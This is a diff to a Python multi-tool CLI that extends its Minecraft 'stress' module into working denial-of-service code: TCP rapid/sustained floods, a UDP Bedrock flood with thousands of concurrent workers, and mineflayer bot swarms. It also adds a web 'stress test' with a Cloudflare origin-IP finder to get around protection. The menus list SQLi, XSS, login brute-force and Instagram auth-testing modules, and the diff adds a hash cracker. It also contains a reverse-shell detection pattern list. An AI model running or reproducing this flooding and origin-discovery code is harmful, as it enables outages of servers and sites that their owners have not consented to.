+        if at == "2":
+            print(f"  {c('[r/1]', Fore.GREEN)}  Rapid fire (max CPS)")
+            print(f"  {c('[s/2]', Fore.GREEN)}  Sustained (hold + keepalives)")
+            ft_raw = input(f"  {c(f'Choice (default r) {SYM_PROMPT} ', Fore.CYAN)}").strip().lower() or "r"
+            ft = {"r": "r", "1": "r", "s": "s", "2": "s"}.get(ft_raw, "r")
+        elif at == "3":
+            ft = "u"
+            print(f"  {c('UDP flood (Bedrock protocol)', Fore.GREEN)}")
+        else:
+            print(f"  {c('[r/1]', Fore.GREEN)}  Rapid fire TCP (max CPS)")
+            print(f"  {c('[s/2]', Fore.GREEN)}  Sustained TCP (hold + keepalive)")
+            print(f"  {c('[u/3]', Fore.GREEN)}  UDP flood (Bedrock)")
+            print(f"  {c('[b/4]', Fore.GREEN)}  Both TCP rapid + UDP")
+            ft_raw = input(f"  {c(f'Choice (default r) {SYM_PROMPT} ', Fore.CYAN)}").strip().lower() or "r"
+            ft = {"r": "r", "1": "r", "s": "s", "2": "s", "u": "u", "3": "u", "b": "b", "4": "b"}.get(ft_raw, "r")
+
+        d_in = input(f"  {c(f'Duration seconds (default 30) {SYM_PROMPT} ', Fore.CYAN)}").strip()
+        dur = int(d_in) if d_in.isdigit() else 30
+        c_in = input(f"  {c(f'Concurrent connections (default 500) {SYM_PROMPT} ', Fore.CYAN)}").strip()
+        cc = int(c_in) if c_in.isdigit() else 500
+
+    # ── Online check ──
+    if flood_enabled:
+        print(f"\n  {c('Checking if host is online...', Fore.CYAN)}", end=" ")
+        sys.stdout.flush()
+        if _probe_online(ip, port):
+            print(f"{GREEN}{SYM_CHECK} online{RESET}")
+        else:
+            print(f"{RED}{SYM_X} unreachable{RESET}")
+            ans = input(f"  {YELLOW}Host not reachable on port {port}. Continue anyway? (y/N) {SYM_PROMPT} {RESET}").strip().lower()
+            if ans != "y":
+                print(f"  {c('Aborted.', Fore.RED)}")
+                return
+
+    # ── Launch bots (non-blocking, background) ──
+    bot_proc = None
+    if bot_enabled:
+        bot_script = os.path.join(os.path.dirname(os.path.abspath(__file__)), "mc_bots.js")
+        if os.path.exists(bot_script):
+            print(f"  {c('Starting mineflayer bots...', Fore.CYAN)}")
+            try:
+                bot_proc = subprocess.Popen(["node", bot_script, ip, str(port), str(bc), str(bd)],
+                                       stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+                def _bot_reader():
+                    for line in iter(bot_proc.stdout.readline, ''):
+                        if line:
+                            sys.stdout.write(f"\r  {c('[Bot]', Fore.MAGENTA)} {line.strip()}{' '*40}\n")
+                            sys.stdout.flush()
+                t = threading.Thread(target=_bot_reader, daemon=True)
+                t.start()
+            except FileNotFoundError:
+                print(f"  {RED}{SYM_X} Node.js not found. Install Node.js 18+ to use mineflayer bots.{RESET}")
+                print(f"  {YELLOW}Falling back to raw TCP bots...{RESET}")
+                bot_enabled = False
+            except Exception as e:
+                print(f"  {RED}{SYM_X} Failed to launch bots: {e}{RESET}")
+                bot_enabled = False
+        else:
+            print(f"  {YELLOW}mc_bots.js not found. Running raw TCP bots in background...{RESET}")
+            def _run_bots():
+                br = {}
+                with ThreadPoolExecutor(max_workers=bc) as ex:
+                    fs = {ex.submit(_mc_bot_worker, ip, port, br, i): i for i in range(bc)}
+                    for f in as_completed(fs):
+                        try: f.result()
+                        except Exception: pass
+            t = threading.Thread(target=_run_bots, daemon=True)
+            t.start()
+
+    # ── Run flood ──
+    if flood_enabled:
+        udp_port = 19132
+        def _run_flood(worker_func, workers, label, use_port, mode="rapid"):
+            _start = time.time()
+            _sent = [0]
+            _errs = [0]
+            br = {}
+            actual_workers = min(workers, 5000)
+            if workers > 5000:
+                print(f"  {YELLOW}Capping concurrent connections to 5000 (OS limit). Your input: {workers}{RESET}")
+
+            def _show_progress(elapsed, total_s, total_e):
+                rate = total_s / elapsed if elapsed > 0 else 0
+                bar_len = 30
+                pct = min(elapsed / dur, 1.0) if dur > 0 else 1
+                filled = int(bar_len * pct)
+                bar = f"{GREEN}{'█'*filled}{DIM}{'░'*(bar_len-filled)}{RESET}"
+                sys.stdout.write(f"\r  {CYAN}{label}{RESET} [{bar}] "
+                                 f"{GREEN}S:{total_s:,}{RESET} "
+                                 f"{RED}E:{total_e:,}{RESET} "
+                                 f"{MAGENTA}{rate:,.0f}/s{RESET} "
+                                 f"{YELLOW}{elapsed:.0f}s/{dur}s{RESET}  "
+                                 f"{DIM}Ctrl+C stop{RESET}{' '*20}")
+                sys.stdout.flush()
+
+            _last_progress = 0
+            ex = ThreadPoolExecutor(max_workers=actual_workers)
+            fs = {ex.submit(worker_func, ip, use_port, dur, br, i, mode): i for i in range(actual_workers)}
+            try:
+                for f in as_completed(fs):
+                    try:
+                        r = f.result()
+                        if isinstance(r, tuple) and len(r) == 2:
+                            _sent[0] += r[0]; _errs[0] += r[1]
+                    except Exception:
+                        pass
+                    elapsed = time.time() - _start
+                    if elapsed - _last_progress >= 0.3:
+                        total_s = sum(v[0] for v in br.values() if isinstance(v, tuple) and len(v) == 2)
+                        total_e = sum(v[1] for v in br.values() if isinstance(v, tuple) and len(v) == 2)
+                        _show_progress(elapsed, total_s, total_e)
+                        _last_progress = elapsed
+            except KeyboardInterrupt:
+                ex.shutdown(wait=False, cancel_futures=True)
+                print()
+                raise
+            finally:
+                ex.shutdown(wait=False, cancel_futures=True)
+
+            el = time.time() - _start
+            total_s = sum(v[0] for v in br.values() if isinstance(v, tuple) and len(v) == 2)
+            total_e = sum(v[1] for v in br.values() if isinstance(v, tuple) and len(v) == 2)
+            _show_progress(el, total_s, total_e)
+            rat = _sent[0] / el if el > 0 else 0
+            print(f"\n  {GREEN}{SYM_CHECK} {label}: {c(f'S:{_sent[0]:,}', Fore.GREEN)} {c(f'E:{_errs[0]:,}', Fore.RED)} in {c(f'{el:.1f}s', Fore.CYAN)} ({c(f'{rat:,.0f}/s', Fore.MAGENTA)}){RESET}")
+            return _sent[0]
+
+        total = 0
+        try:
+            if ft in ("r", "s"):
+                mode = "rapid" if ft == "r" else "sustained"
+                total += _run_flood(mc_tcp_flood_worker, cc, "TCP flood", port, mode)
+            elif ft == "u":
+                total += _run_flood(mc_udp_flood_worker, cc, "UDP flood", udp_port)
+            elif ft == "b":
+                total += _run_flood(mc_tcp_flood_worker, cc, "TCP flood", port, "rapid")
+                total += _run_flood(mc_udp_flood_worker, cc, "UDP flood", udp_port)
+            print(f"  {c(SYM_CHECK + f' Total: {total:,} packets sent', Fore.GREEN)}")
+        except KeyboardInterrupt:
+            print(f"\n  {YELLOW}Flood stopped by user.{RESET}")
+    else:
+        print(f"  {c('Bot attack running in background. Press Ctrl+C to stop.', Fore.YELLOW)}")
+        try:
+            while True:
+                if bot_proc and bot_proc.poll() is not None:
+                    print(f"\n  {c('Bots finished.', Fore.GREEN)}")
+                    break
+                time.sleep(1)
+        except KeyboardInterrupt:
+            print(f"\n  {YELLOW}Stopped.{RESET}")
+            if bot_proc:
+                try: bot_proc.terminate()
+                except Exception: pass
+
+    print()
 
 
 def http_worker(session, url, results, idx, verify_ssl):
@@ -2848,15 +4084,39 @@ def stress_web():
     header_box("Web Stress Test", Fore.RED)
     target = input(f"  {c(f'Target IP/domain {SYM_PROMPT} ', Fore.CYAN)}").strip()
     if not target: return
-    ip = legacy_resolve(target)
-    if not ip: return
-
     hostname = target
-    try:
-        socket.inet_aton(target)
-        hostname = target
-    except OSError:
-        hostname = target
+
+    if _is_ip(target):
+        ip = target
+        print(f"  {c('Target is an IP:', Fore.GREEN)} {ip}")
+    else:
+        ips = resolve_ip_candidates(target)
+        if not ips:
+            print(f"  {c(SYM_X + ' Could not resolve', Fore.RED)} {target}")
+            return
+        cf_list = [x for x in ips if _is_cloudflare(x)]
+        non_cf = [x for x in ips if not _is_cloudflare(x)]
+        print(f"  {c('Resolved IPs:', Fore.GREEN)} {', '.join(ips)}")
+        if non_cf:
+            ip = non_cf[0]
+            print(f"  {c('Using non-Cloudflare IP:', Fore.GREEN)} {ip}")
+        elif cf_list:
+            print(f"  {YELLOW}All resolved IPs are behind Cloudflare — scanning may not reach the origin.{RESET}")
+            ip = cf_list[0]
+            ans = input(f"  {c(f'Try to find the real origin IP? (y/N) {SYM_PROMPT} ', Fore.YELLOW)}").strip().lower()
+            if ans == "y":
+                print(f"  {c('Searching for origin IP (may take up to a minute)...', Fore.YELLOW)}")
+                try:
+                    real_ips = cf_bypass(target, verbose=False)
+                    if real_ips:
+                        ip = real_ips[0]
+                        print(f"  {c(f'Found candidate IP: {ip}', Fore.GREEN)}")
+                    else:
+                        print(f"  {c('No origin IP found — continuing with Cloudflare IP.', Fore.YELLOW)}")
+                except Exception as e:
+                    print(f"  {c(f'Origin search failed: {e}', Fore.YELLOW)}")
+        else:
+            ip = ips[0]
 
     print(f"  {c('Note:', Fore.YELLOW)} Using hostname '{hostname}' for requests (Host header must match your domain)")
     print(f"  {c('Note:', Fore.YELLOW)} Platforms like Vercel/Cloudflare block nmap scans — enter ports manually if none detected")
@@ -3302,7 +4562,8 @@ def osint_ipgeo():
         try: ip = socket.gethostbyname(target); print(f"  {c(SYM_CHECK, Fore.GREEN)} {target} {SYM_ARROW} {ip}")
         except: print(f"  {RED}Could not resolve.{RESET}"); return
     try:
-        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,hosting", timeout=10)
+        with spinner("Querying ip-api.com...", Fore.YELLOW):
+            r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,hosting", timeout=10)
         d = r.json()
         if d.get("status") == "success":
             lines = [f"  IP: {c(ip, Fore.GREEN)}", f"  Location: {c(d.get('city','?'), Fore.MAGENTA)}, {c(d.get('regionName','?'), Fore.CYAN)} {c(d.get('zip','?'), Fore.GREEN)}", f"  Country: {c(d.get('country','?'), Fore.YELLOW)}", f"  ISP: {c(d.get('isp','?'), Fore.CYAN)}", f"  ASN: {c(d.get('as','?'), Fore.MAGENTA)}", f"  Lat/Lon: {c(str(d.get('lat','?')), Fore.GREEN)}, {c(str(d.get('lon','?')), Fore.CYAN)}", f"  TZ: {c(d.get('timezone','?'), Fore.YELLOW)}", f"  Proxy/VPN: {c(SYM_CHECK, Fore.RED) if d.get('proxy') or d.get('hosting') else c('No', Fore.GREEN)}"]
@@ -3318,19 +4579,20 @@ def osint_dns():
     domain = input(f"  {c(f'Domain {SYM_PROMPT} ', Fore.CYAN)}").strip().lower()
     if not domain: return
     has_dig = shutil.which("dig")
-    for rtype in ["A","AAAA","MX","NS","TXT","CNAME","SOA"]:
-        records = []
-        if has_dig:
-            try:
-                r = subprocess.run(["dig","+short",domain,rtype], capture_output=True, text=True, timeout=5)
-                if r.stdout.strip(): records = [l.strip() for l in r.stdout.strip().splitlines() if l.strip()]
-            except: pass
-        else:
-            try:
-                if rtype == "A": records = [socket.gethostbyname(domain)]
-            except: pass
-        if records:
-            print(f"  {c(f'{rtype:5s}:', Fore.CYAN)} {c(', '.join(records[:3]), Fore.GREEN)}")
+    with spinner("Enumerating DNS records...", Fore.YELLOW):
+        for rtype in ["A","AAAA","MX","NS","TXT","CNAME","SOA"]:
+            records = []
+            if has_dig:
+                try:
+                    r = subprocess.run(["dig","+short",domain,rtype], capture_output=True, text=True, timeout=5)
+                    if r.stdout.strip(): records = [l.strip() for l in r.stdout.strip().splitlines() if l.strip()]
+                except: pass
+            else:
+                try:
+                    if rtype == "A": records = [socket.gethostbyname(domain)]
+                except: pass
+            if records:
+                print(f"  {c(f'{rtype:5s}:', Fore.CYAN)} {c(', '.join(records[:3]), Fore.GREEN)}")
     print()
 
 
@@ -3610,10 +4872,15 @@ def menu_stress():
         print(f"  {c('[3]', Fore.GREEN)}  IP Flood")
         print(f"  {c('[b]', Fore.CYAN)}   Back")
         print()
-        ch = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
-        if ch == "b": break
-        {"1": stress_minecraft, "2": stress_web, "3": stress_ip}.get(ch, lambda: None)()
-        if ch not in ("1","2","3"): print(f"  {RED}Invalid.{RESET}")
+        try:
+            ch = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
+            if ch == "b": break
+            {"1": stress_minecraft, "2": stress_web, "3": stress_ip}.get(ch, lambda: None)()
+            if ch not in ("1","2","3"): print(f"  {RED}Invalid.{RESET}")
+        except KeyboardInterrupt:
+            break
+        except Exception as e:
+            print(f"  {RED}{SYM_X} Error: {e}{RESET}")
 
 
 def menu_osint():
@@ -3630,12 +4897,17 @@ def menu_osint():
         print(f"  {c('[9]', Fore.GREEN)}  Web Recon (Dir Brute)")
         print(f"  {c('[b]', Fore.CYAN)}   Back")
         print()
-        ch = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
-        if ch == "b": break
-        ac = {"1": osint_phone, "2": osint_email, "3": osint_ipgeo, "4": osint_dns,
-              "5": osint_subdomain, "6": osint_social, "7": osint_website, "8": osint_whois, "9": legacy_web_recon}
-        if ch in ac: ac[ch]()
-        else: print(f"  {RED}Invalid.{RESET}")
+        try:
+            ch = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
+            if ch == "b": break
+            ac = {"1": osint_phone, "2": osint_email, "3": osint_ipgeo, "4": osint_dns,
+                  "5": osint_subdomain, "6": osint_social, "7": osint_website, "8": osint_whois, "9": legacy_web_recon}
+            if ch in ac: ac[ch]()
+            else: print(f"  {RED}Invalid.{RESET}")
+        except KeyboardInterrupt:
+            break
+        except Exception as e:
+            print(f"  {RED}{SYM_X} Error: {e}{RESET}")
 
 
 def menu_telephone():
@@ -3646,10 +4918,15 @@ def menu_telephone():
         print(f"  {c('[3]', Fore.GREEN)}  Format Number")
         print(f"  {c('[b]', Fore.CYAN)}   Back")
         print()
-        ch = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
-        if ch == "b": break
-        {"1": tel_analyze, "2": tel_country_codes, "3": tel_format}.get(ch, lambda: None)()
-        if ch not in ("1","2","3"): print(f"  {RED}Invalid.{RESET}")
+        try:
+            ch = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
+            if ch == "b": break
+            {"1": tel_analyze, "2": tel_country_codes, "3": tel_format}.get(ch, lambda: None)()
+            if ch not in ("1","2","3"): print(f"  {RED}Invalid.{RESET}")
+        except KeyboardInterrupt:
+            break
+        except Exception as e:
+            print(f"  {RED}{SYM_X} Error: {e}{RESET}")
 
 
 def menu_netutils():
@@ -3662,11 +4939,16 @@ def menu_netutils():
         print(f"  {c('[5]', Fore.GREEN)}  Traceroute")
         print(f"  {c('[b]', Fore.CYAN)}   Back")
         print()
-        ch = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
-        if ch == "b": break
-        ac = {"1": legacy_portscan, "2": legacy_sslcheck, "3": legacy_httpheaders, "4": legacy_ping, "5": legacy_traceroute}
-        if ch in ac: ac[ch]()
-        else: print(f"  {RED}Invalid.{RESET}")
+        try:
+            ch = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
+            if ch == "b": break
+            ac = {"1": legacy_portscan, "2": legacy_sslcheck, "3": legacy_httpheaders, "4": legacy_ping, "5": legacy_traceroute}
+            if ch in ac: ac[ch]()
+            else: print(f"  {RED}Invalid.{RESET}")
+        except KeyboardInterrupt:
+            break
+        except Exception as e:
+            print(f"  {RED}{SYM_X} Error: {e}{RESET}")
 
 
 # ──────────────────────────────────────────────────────────
@@ -3684,12 +4966,17 @@ def menu_network_threat():
         print(f"  {c('[6]', Fore.GREEN)}  DDoS Detection")
         print(f"  {c('[b]', Fore.CYAN)}   Back to main menu")
         print()
-        choice = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
-        if choice == "b": break
-        actions = {"1": net_capture, "2": net_traffic_monitor, "3": net_ids,
-                   "4": net_arp_detect, "5": net_portscan_detect, "6": net_ddos_detect}
-        if choice in actions: actions[choice]()
-        else: print(f"  {RED}Invalid choice.{RESET}")
+        try:
+            choice = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
+            if choice == "b": break
+            actions = {"1": net_capture, "2": net_traffic_monitor, "3": net_ids,
+                       "4": net_arp_detect, "5": net_portscan_detect, "6": net_ddos_detect}
+            if choice in actions: actions[choice]()
+            else: print(f"  {RED}Invalid choice.{RESET}")
+        except KeyboardInterrupt:
+            break
+        except Exception as e:
+            print(f"  {RED}{SYM_X} Error: {e}{RESET}")
 
 
 def menu_endpoint():
@@ -3701,12 +4988,17 @@ def menu_endpoint():
         print(f"  {c('[4]', Fore.GREEN)}  Network Connection Monitor")
         print(f"  {c('[b]', Fore.CYAN)}   Back to main menu")
         print()
-        choice = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
-        if choice == "b": break
-        actions = {"1": ep_process_monitor, "2": ep_suspicious_processes,
-                   "3": ep_file_integrity, "4": ep_network_connections}
-        if choice in actions: actions[choice]()
-        else: print(f"  {RED}Invalid choice.{RESET}")
+        try:
+            choice = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
+            if choice == "b": break
+            actions = {"1": ep_process_monitor, "2": ep_suspicious_processes,
+                       "3": ep_file_integrity, "4": ep_network_connections}
+            if choice in actions: actions[choice]()
+            else: print(f"  {RED}Invalid choice.{RESET}")
+        except KeyboardInterrupt:
+            break
+        except Exception as e:
+            print(f"  {RED}{SYM_X} Error: {e}{RESET}")
 
 
 def menu_vuln():
@@ -3718,12 +5010,17 @@ def menu_vuln():
         print(f"  {c('[4]', Fore.GREEN)}  Security Config Checker")
         print(f"  {c('[b]', Fore.CYAN)}   Back to main menu")
         print()
-        choice = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
-        if choice == "b": break
-        actions = {"1": vuln_advanced_scan, "2": vuln_cve_lookup,
-                   "3": vuln_assessment, "4": vuln_config_check}
-        if choice in actions: actions[choice]()
-        else: print(f"  {RED}Invalid choice.{RESET}")
+        try:
+            choice = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
+            if choice == "b": break
+            actions = {"1": vuln_advanced_scan, "2": vuln_cve_lookup,
+                       "3": vuln_assessment, "4": vuln_config_check}
+            if choice in actions: actions[choice]()
+            else: print(f"  {RED}Invalid choice.{RESET}")
+        except KeyboardInterrupt:
+            break
+        except Exception as e:
+            print(f"  {RED}{SYM_X} Error: {e}{RESET}")
 
 
 def menu_data():
@@ -3734,11 +5031,16 @@ def menu_data():
         print(f"  {c('[3]', Fore.GREEN)}  Brute-Force Detection")
         print(f"  {c('[b]', Fore.CYAN)}   Back to main menu")
         print()
-        choice = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
-        if choice == "b": break
-        actions = {"1": data_encrypt, "2": data_password_strength, "3": data_bruteforce_detect}
-        if choice in actions: actions[choice]()
-        else: print(f"  {RED}Invalid choice.{RESET}")
+        try:
+            choice = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
+            if choice == "b": break
+            actions = {"1": data_encrypt, "2": data_password_strength, "3": data_bruteforce_detect}
+            if choice in actions: actions[choice]()
+            else: print(f"  {RED}Invalid choice.{RESET}")
+        except KeyboardInterrupt:
+            break
+        except Exception as e:
+            print(f"  {RED}{SYM_X} Error: {e}{RESET}")
 
 
 def menu_pentest():
@@ -3753,12 +5055,17 @@ def menu_pentest():
         print(f"  {c('[7]', Fore.MAGENTA)}  Instagram OSINT & Auth Tester")
         print(f"  {c('[b]', Fore.CYAN)}   Back to main menu")
         print()
-        choice = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
-        if choice == "b": break
-        actions = {"1": pentest_sqli, "2": pentest_xss, "3": pentest_path_traversal,
-                   "4": pentest_subdomain_takeover, "5": pentest_http_methods, "6": pentest_bruteforce_login, "7": pentest_instagram}
-        if choice in actions: actions[choice]()
-        else: print(f"  {RED}Invalid choice.{RESET}")
+        try:
+            choice = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
+            if choice == "b": break
+            actions = {"1": pentest_sqli, "2": pentest_xss, "3": pentest_path_traversal,
+                       "4": pentest_subdomain_takeover, "5": pentest_http_methods, "6": pentest_bruteforce_login, "7": pentest_instagram}
+            if choice in actions: actions[choice]()
+            else: print(f"  {RED}Invalid choice.{RESET}")
+        except KeyboardInterrupt:
+            break
+        except Exception as e:
+            print(f"  {RED}{SYM_X} Error: {e}{RESET}")
 
 
 def menu_siem():
@@ -3770,12 +5077,17 @@ def menu_siem():
         print(f"  {c('[4]', Fore.GREEN)}  Threat Pattern Detection")
         print(f"  {c('[b]', Fore.CYAN)}   Back to main menu")
         print()
-        choice = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
-        if choice == "b": break
-        actions = {"1": siem_log_analyzer, "2": siem_realtime_monitor,
-                   "3": siem_alert_viewer, "4": siem_threat_patterns}
-        if choice in actions: actions[choice]()
-        else: print(f"  {RED}Invalid choice.{RESET}")
+        try:
+            choice = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
+            if choice == "b": break
+            actions = {"1": siem_log_analyzer, "2": siem_realtime_monitor,
+                       "3": siem_alert_viewer, "4": siem_threat_patterns}
+            if choice in actions: actions[choice]()
+            else: print(f"  {RED}Invalid choice.{RESET}")
+        except KeyboardInterrupt:
+            break
+        except Exception as e:
+            print(f"  {RED}{SYM_X} Error: {e}{RESET}")
 
 
 # ──────────────────────────────────────────────────────────
@@ -3786,13 +5098,16 @@ def _ensure_mineflayer():
     tool_dir = os.path.dirname(os.path.abspath(__file__))
     nm_dir = os.path.join(tool_dir, "node_modules", "mineflayer")
     if not os.path.isdir(nm_dir):
-        alt_dir = os.path.join(os.path.dirname(tool_dir), "v2.1", "node_modules", "mineflayer")
+        alt_dir = os.path.join(os.path.dirname(tool_dir), "v2", "node_modules", "mineflayer")
         if os.path.isdir(alt_dir):
             return
-        alt_dir2 = os.path.join(os.path.dirname(tool_dir), "v2.2", "node_modules", "mineflayer")
+        alt_dir2 = os.path.join(os.path.dirname(tool_dir), "v2.1", "node_modules", "mineflayer")
         if os.path.isdir(alt_dir2):
             return
-        print(f"  {YELLOW}{SYM_WARN}  Mineflayer not found. Install with: cd v2.1 && npm install{RESET}")
+        alt_dir3 = os.path.join(os.path.dirname(tool_dir), "v2.2", "node_modules", "mineflayer")
+        if os.path.isdir(alt_dir3):
+            return
+        print(f"  {YELLOW}{SYM_WARN}  Mineflayer not found. Install with: cd v3 && npm install mineflayer{RESET}")
         try:
             subprocess.run(["npm", "install", "mineflayer"], cwd=tool_dir, capture_output=True, timeout=120)
             print(f"  {GREEN}{SYM_CHECK}  Mineflayer installed.{RESET}")
@@ -3817,7 +5132,21 @@ def _mc_packet(pid, *parts):
     body = bytes([pid]) + b"".join(parts)
     return _mc_varint(len(body)) + body
 
+
+def _mc_read_varint(sock):
+    v = 0
+    for i in range(5):
+        b = sock.recv(1)
+        if not b:
+            return None
+        v |= (b[0] & 0x7F) << (7 * i)
+        if not (b[0] & 0x80):
+            break
+    return v
+
+
 def _mc_bot_worker(host, port, results, idx):
+    s = None
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(5)
@@ -3850,10 +5179,13 @@ def _mc_bot_worker(host, port, results, idx):
                 continue
             except Exception:
                 break
-        s.close()
         results[idx] = 1
     except Exception:
         results[idx] = 0
+    finally:
+        if s:
+            try: s.close()
+            except Exception: pass
 
 # ──────────────────────────────────────────────────────────
 #  MODULE 11: HASH & CRYPTO TOOLS
@@ -3909,6 +5241,10 @@ def hash_cracker():
     target = input(f"  {c(f'Hash to crack {SYM_PROMPT} ', Fore.CYAN)}").strip()
     if not target: return
     algo = input(f"  {c(f'Algorithm (md5/sha1/sha256) {SYM_PROMPT} ', Fore.CYAN)}").strip().lower() or "md5"
+    if algo not in hashlib.algorithms_available:
+        print(f"  {RED}{SYM_X} Unknown algorithm: {algo}{RESET}")
+        print(f"  {YELLOW}Available: md5, sha1, sha256, sha384, sha512, sha224, sha3_256, etc.{RESET}")
+        return
     wordlist = input(f"  {c(f'Wordlist path (empty=built-in) {SYM_PROMPT} ', Fore.CYAN)}").strip()
     words = []
     if wordlist and os.path.exists(wordlist):
@@ -3934,6 +5270,9 @@ def hash_cracker():
                 add_log_alert("HIGH", "HashCrack", f"Cracked {algo}: {word}")
                 found = True
                 break
+        except ValueError:
+            print(f"  {RED}{SYM_X} Invalid algorithm: {algo}{RESET}")
+            return
         except Exception: pass
         if i % 50 == 0:
             sys.stdout.write(f"\r  {progress_bar(i, len(words))}  ")
@@ -4343,7 +5682,7 @@ def net_banner_grab():
             banner = s.recv(1024).decode(errors="replace").strip()
             s.close()
             if banner: print(f"    {c(f'Port {port:5d}', Fore.GREEN)} {c(banner[:80], Fore.CYAN)}")
-            else: print(f"    {c(f'Port {port:5d}', Fore.GREEN)} {c('no banner', Fore.DIM)}")
+            else: print(f"    {c(f'Port {port:5d}', Fore.GREEN)} {dim('no banner')}")
         except: print(f"    {c(f'Port {port:5d}', Fore.GREEN)} {c('closed', Fore.RED)}")
     print()
 
@@ -4357,13 +5696,23 @@ def net_reverse_shell_detect():
                 (r'0<&.*-',"fd redirect"),(r'exec\s+\d+<>/dev/tcp',"exec /dev/tcp")]
     found = []
     try:
-        r = subprocess.run(["ps", "aux"], capture_output=True, text=True, timeout=5)
-        for line in r.stdout.splitlines():
-            for pat, desc in patterns:
-                if re.search(pat, line, re.IGNORECASE):
-                    found.append((desc, line.strip()[:100]))
-                    print(f"    {c(SYM_X, Fore.RED)} [{desc}] {c(line.strip()[:80], Fore.YELLOW)}")
-                    add_log_alert("CRITICAL", "RevShell", f"Pattern: {desc}")
+        system = platform.system().lower()
+        if system == "windows":
+            r = subprocess.run(["tasklist", "/FO", "CSV", "/NH"], capture_output=True, text=True, timeout=5, encoding="utf-8", errors="replace")
+            for line in r.stdout.splitlines():
+                for pat, desc in patterns:
+                    if re.search(pat, line, re.IGNORECASE):
+                        found.append((desc, line.strip()[:100]))
+                        print(f"    {c(SYM_X, Fore.RED)} [{desc}] {c(line.strip()[:80], Fore.YELLOW)}")
+                        add_log_alert("CRITICAL", "RevShell", f"Pattern: {desc}")
+        else:
+            r = subprocess.run(["ps", "aux"], capture_output=True, text=True, timeout=5)
+            for line in r.stdout.splitlines():
+                for pat, desc in patterns:
+                    if re.search(pat, line, re.IGNORECASE):
+                        found.append((desc, line.strip()[:100]))
+                        print(f"    {c(SYM_X, Fore.RED)} [{desc}] {c(line.strip()[:80], Fore.YELLOW)}")
+                        add_log_alert("CRITICAL", "RevShell", f"Pattern: {desc}")
     except: pass
     if not found: print(f"  {GREEN}{SYM_CHECK} No reverse shell patterns detected.{RESET}")
     else: print(f"\n  {RED}{SYM_WARN} {len(found)} suspicious patterns!{RESET}")
@@ -4446,7 +5795,7 @@ def net_lan_discovery():
         except Exception as e: print(f"  {RED}{SYM_X} Error: {e}{RESET}")
     else:
         try:
-            cmd = ["arp", "-a"] if system != "windows" else ["arp", "-a"]
+            cmd = ["arp", "-a"]
             r = subprocess.run(cmd, capture_output=True, text=True, timeout=10, encoding="utf-8", errors="replace")
             for line in r.stdout.splitlines():
                 m = re.search(r'\((\d+\.\d+\.\d+\.\d+)\)\s+at\s+(\S+)', line)
@@ -4507,6 +5856,306 @@ def osint_shodan():
                 print(f"  Ports: {c(str(data.get('ports',[])), Fore.GREEN)}")
                 print(f"  Hostnames: {c(str(data.get('hostnames',[])), Fore.CYAN)}")
         except: pass
+    print()
+
+def _mc_server_ping(ip, port=25565, timeout=4):
+    """Minecraft server list ping — returns MOTD if server responds"""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        s.connect((ip, port))
+        hs = _mc_packet(0x00, _mc_varint(764), _mc_pstr(f"{ip}:{port}"), port.to_bytes(2, "big"), _mc_varint(2))
+        s.sendall(hs + _mc_packet(0x00, _mc_packet(0x01)))
+        s.sendall(_mc_varint(0x01) + _mc_varint(0x00))
+        s.settimeout(timeout)
+        plen = _mc_read_varint(s)
+        if plen:
+            pid = _mc_read_varint(s)
+            rlen = _mc_read_varint(s)
+            if rlen:
+                data = b""
+                while len(data) < rlen:
+                    c = s.recv(rlen - len(data))
+                    if not c: break
+                    data += c
+                s.close()
+                try: return json.loads(data)
+                except: return None
+        s.close()
+    except: pass
+    return None
+
+
+def _http_get(url, timeout=15):
+    """HTTP GET via curl if requests fails, else requests"""
+    try:
+        r = requests.get(url, timeout=timeout, headers={"User-Agent": "Mozilla/5.0"}, verify=False)
+        if r.status_code == 200:
+            return r.text
+    except: pass
+    try:
+        r = subprocess.run(["curl", "-s", "--max-time", str(timeout), url], capture_output=True, text=True, timeout=timeout+5)
+        return r.stdout if r.stdout else None
+    except: pass
+    return None
+
+
+def cf_bypass(domain, verbose=True):
+    """Cloudflare real IP finder — uses crt.sh + Shodan InternetDB (free, no keys) + DNS/SSL/MC probes"""
+    def _log(m):
+        if verbose: print(f"  {m}")
+    def _is_cf(ip):
+        for p in ["104.16.", "104.17.", "104.18.", "104.19.", "104.20.", "104.21.", "104.22.", "104.23.",
+                   "104.24.", "104.25.", "104.26.", "104.27.", "172.64.", "172.65.", "172.66.", "172.67.",
+                   "173.245.", "103.21.", "103.22.", "103.31.", "141.101.", "108.162.", "190.93.", "188.114.",
+                   "197.234.", "198.41."]:
+            if ip.startswith(p): return True
+        return False
+
+    found_ips = []
+    seen_ips = set()
